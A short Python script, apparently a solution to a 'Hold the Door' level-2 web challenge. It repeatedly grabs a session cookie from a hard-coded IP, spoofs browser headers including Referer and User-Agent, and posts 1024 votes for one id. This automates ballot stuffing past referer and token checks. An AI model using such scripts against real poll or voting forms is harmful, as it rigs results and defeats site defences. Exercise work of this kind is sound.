#!/usr/bin/python3
import requests


for i in range(1024):
    r = requests.get("http://158.69.76.135/level2.php")
    galleta = r.cookies['HoldTheDoor']
    headers = {'Host': '158.69.76.135',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip, deflate',
               'Referer': 'http://158.69.76.135/level2.php',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Connection': 'keep-alive',
               'Upgrade-Insecure-Requests': 1,
               'Pragma': 'no-cache',
               'Cache-Control': 'no-cache'}

    payload = {'id': 766, 'holdthedoor': 'Submit', 'key': galleta}
    r1 = requests.post("http://158.69.76.135/level2.php", data=payload,
                       cookies={'HoldTheDoor': galleta}, headers=headers)
